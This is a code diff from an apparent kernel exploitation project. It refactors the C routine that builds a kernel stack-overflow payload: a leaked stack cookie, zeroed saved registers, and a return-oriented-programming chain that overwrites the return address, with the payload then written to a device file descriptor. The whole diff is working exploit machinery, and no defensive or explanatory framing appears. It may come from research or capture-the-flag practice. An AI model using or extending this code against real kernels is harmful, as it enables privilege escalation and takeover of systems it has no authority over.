@@ -1,5 +1,7 @@
 #include "stack_overflow.h"
 #include "utils.h"
+#include "rop.h"
+#include <stddef.h>
 
 /* Leak kernel stack cookie */
 uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
@@ -34,7 +36,7 @@ uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
 void stack_overflow(int fd, 
                     uintptr_t cookie, size_t cookie_offset, 
                     size_t pl_sz, 
-                    uintptr_t rop[])
+                    rop_chain_t rop)
 {
     size_t pl_slots = pl_sz / sizeof(uintptr_t);
 
@@ -58,17 +60,12 @@ void stack_overflow(int fd,
     pl[pos++] = 0x0;        // r12
     pl[pos++] = 0x0;        // saved rbp
 
-    // RIP — first gadget of chain
-    pl[pos++] = rop[0];
-
-    // Rest of ROP chain (if any)
-    size_t i = 1;
-    while (i < pl_slots - pos && rop[i]) {
-        pl[pos++] = rop[i++];
-    }
+    // RIP ⟵ ROP chain 
+    for (size_t i = 0; i < rop.count && pos < pl_slots; i++)
+        pl[pos++] = rop.chain[i];
 
     hexdump("[DEBUG] Payload", pl, pl_sz);
-    INFO("Return addrss will be overwritten with ROP starting with: 0x%016lx", rop[0]);
+    INFO("Return addrss will be overwritten with ROP starting with: 0x%016lx", rop.chain[0]);
 
     ssize_t written = write(fd, pl, pl_sz);
     if (written < 0)
